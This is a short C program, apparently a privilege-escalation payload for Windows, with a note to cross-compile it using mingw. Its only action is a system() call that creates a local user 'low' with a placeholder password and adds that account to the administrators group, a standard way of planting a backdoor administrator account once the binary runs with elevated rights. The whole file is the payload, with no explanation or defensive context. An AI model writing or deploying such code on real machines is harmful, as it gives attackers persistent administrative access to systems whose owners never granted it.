#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
int main ()
{
int i;
i=system ("net user /add low PASSWORD && net localgroup administrators low /add");
return 0;
}
/* compile with i686-w64-mingw32-gcc without any extra flags */